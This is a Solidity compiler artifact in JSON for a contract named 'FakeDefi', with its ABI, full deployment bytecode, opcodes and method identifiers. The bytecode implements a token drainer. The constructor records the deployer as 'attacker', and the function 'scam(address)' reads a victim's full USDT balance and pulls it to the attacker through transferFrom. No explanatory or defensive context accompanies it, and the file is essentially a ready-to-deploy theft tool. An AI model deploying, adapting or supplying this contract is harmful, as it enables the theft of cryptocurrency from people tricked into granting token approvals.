{
  "contracts/FakeDefi.sol": {
    "FakeDefi": {
      "abi": [
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "usdtToken",
              "type": "address"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "inputs": [],
          "name": "attacker",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "account",
              "type": "address"
            }
          ],
          "name": "scam",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "token",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "608060405234801561001057600080fd5b5060405161064a38038061064a8339818101604052810190610032919061011c565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b6104f2806101586000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806348eb76ee14610046578063619f6ab814610064578063fc0c546a14610080575b600080fd5b61004e61009e565b60405161005b91906102b8565b60405180910390f35b61007e60048036038101906100799190610304565b6100c2565b005b610088610251565b60405161009591906102b8565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008173ffffffffffffffffffffffffffffffffffffffff166370a08231846040518263ffffffff1660e01b815260040161012491906102b8565b602060405180830381865afa158015610141573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101659190610367565b905060008273ffffffffffffffffffffffffffffffffffffffff166323b872dd8560008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16856040518463ffffffff1660e01b81526004016101c6939291906103a3565b6020604051808303816000875af11580156101e5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102099190610412565b90508061024b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102429061049c565b60405180910390fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102a282610277565b9050919050565b6102b281610297565b82525050565b60006020820190506102cd60008301846102a9565b92915050565b600080fd5b6102e181610297565b81146102ec57600080fd5b50565b6000813590506102fe816102d8565b92915050565b60006020828403121561031a576103196102d3565b5b6000610328848285016102ef565b91505092915050565b6000819050919050565b61034481610331565b811461034f57600080fd5b50565b6000815190506103618161033b565b92915050565b60006020828403121561037d5761037c6102d3565b5b600061038b84828501610352565b91505092915050565b61039d81610331565b82525050565b60006060820190506103b860008301866102a9565b6103c560208301856102a9565b6103d26040830184610394565b949350505050565b60008115159050919050565b6103ef816103da565b81146103fa57600080fd5b50565b60008151905061040c816103e6565b92915050565b600060208284031215610428576104276102d3565b5b6000610436848285016103fd565b91505092915050565b600082825260208201905092915050565b7f546f6b656e207472616e73666572206661696c65640000000000000000000000600082015250565b600061048660158361043f565b915061049182610450565b602082019050919050565b600060208201905081810360008301526104b581610479565b905091905056fea2646970667358221220a94b3b1a759692eea361670bcca347e5e4322dc9196679e63e1f2dd9e88ab14464736f6c634300081b0033",
          "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x64A CODESIZE SUB DUP1 PUSH2 0x64A DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x11C JUMP JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x149 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE9 DUP3 PUSH2 0xBE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF9 DUP2 PUSH2 0xDE JUMP JUMPDEST DUP2 EQ PUSH2 0x104 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x116 DUP2 PUSH2 0xF0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x132 JUMPI PUSH2 0x131 PUSH2 0xB9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x140 DUP5 DUP3 DUP6 ADD PUSH2 0x107 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4F2 DUP1 PUSH2 0x158 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x619F6AB8 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xFC0C546A EQ PUSH2 0x80 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x9E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2B8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x304 JUMP JUMPDEST PUSH2 0xC2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x88 PUSH2 0x251 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x95 SWAP2 SWAP1 PUSH2 0x2B8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP PUSH1 0x0 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 DUP5 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x124 SWAP2 SWAP1 PUSH2 0x2B8 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x141 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x165 SWAP2 SWAP1 PUSH2 0x367 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP6 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP6 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1C6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x3A3 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1E5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x209 SWAP2 SWAP1 PUSH2 0x412 JUMP JUMPDEST SWAP1 POP DUP1 PUSH2 0x24B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x242 SWAP1 PUSH2 0x49C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A2 DUP3 PUSH2 0x277 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B2 DUP2 PUSH2 0x297 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2CD PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2A9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2E1 DUP2 PUSH2 0x297 JUMP JUMPDEST DUP2 EQ PUSH2 0x2EC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2FE DUP2 PUSH2 0x2D8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x31A JUMPI PUSH2 0x319 PUSH2 0x2D3 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x328 DUP5 DUP3 DUP6 ADD PUSH2 0x2EF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x344 DUP2 PUSH2 0x331 JUMP JUMPDEST DUP2 EQ PUSH2 0x34F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x361 DUP2 PUSH2 0x33B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x37D JUMPI PUSH2 0x37C PUSH2 0x2D3 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x38B DUP5 DUP3 DUP6 ADD PUSH2 0x352 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x39D DUP2 PUSH2 0x331 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x3B8 PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x2A9 JUMP JUMPDEST PUSH2 0x3C5 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x2A9 JUMP JUMPDEST PUSH2 0x3D2 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x394 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3EF DUP2 PUSH2 0x3DA JUMP JUMPDEST DUP2 EQ PUSH2 0x3FA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x40C DUP2 PUSH2 0x3E6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x428 JUMPI PUSH2 0x427 PUSH2 0x2D3 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x436 DUP5 DUP3 DUP6 ADD PUSH2 0x3FD JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x546F6B656E207472616E73666572206661696C65640000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x486 PUSH1 0x15 DUP4 PUSH2 0x43F JUMP JUMPDEST SWAP2 POP PUSH2 0x491 DUP3 PUSH2 0x450 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x4B5 DUP2 PUSH2 0x479 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xA9 0x4B EXTCODESIZE BYTE PUSH22 0x9692EEA361670BCCA347E5E4322DC9196679E63E1F2D 0xD9 0xE8 DUP11 0xB1 PREVRANDAO PUSH5 0x736F6C6343 STOP ADDMOD SHL STOP CALLER "
        },
        "methodIdentifiers": {
          "attacker()": "48eb76ee",
          "scam(address)": "619f6ab8",
          "token()": "fc0c546a"
        }
      }
    }
  }
}